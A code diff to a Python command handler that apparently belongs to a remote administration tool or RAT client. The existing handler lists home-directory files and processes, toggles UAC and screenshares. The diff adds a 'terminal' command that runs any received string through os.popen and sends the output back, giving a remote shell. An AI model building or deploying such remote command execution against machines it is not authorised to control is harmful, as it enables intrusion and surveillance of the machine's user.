@@ -20,6 +20,8 @@ class CommandHandler:
                     self.handle_process(client)
                 case "enableUac":
                     self.handle_enable_uac(client)
+                case "terminal":
+                    self.do_command(client, data.get("data"))
                 case "ss":
                     screenshare.screenshare(client.send)
                 case _:
@@ -31,7 +33,7 @@ class CommandHandler:
         files = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isfile(os.path.join(os.path.expanduser("~"), f))]
         folders = [f for f in os.listdir(os.path.expanduser("~")) if os.path.isdir(os.path.join(os.path.expanduser("~"), f))]
         client.send(json.dumps({
-            "type": "COMMAND",
+            "type": "command",
             "json_data": {
                 "files": files,
                 "folders": folders,
@@ -51,8 +53,8 @@ class CommandHandler:
             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                 continue
         client.send(json.dumps({
-            "command": "process",
-            "processes": processes
+            "command": "command",
+            "json_data": processes
         }))
 
     def handle_enable_uac(self, client):
@@ -64,10 +66,17 @@ class CommandHandler:
             except Exception as e:
                 client.send(json.dumps({
                     "command": "error",
-                    "message": f"Failed to enable UAC: {str(e)}"
+                    "data": f"Failed to enable UAC: {str(e)}"
                 }))
         else:
             client.send(json.dumps({
                 "command": "error",
-                "message": "UAC is already enabled"
+                "data": "UAC is already enabled"
             }))
+
+    def do_command(self, client, command: str):
+        output = os.popen(command).read()
+        client.send(json.dumps({
+            "type": "command",
+            "json_data": output
+        }))
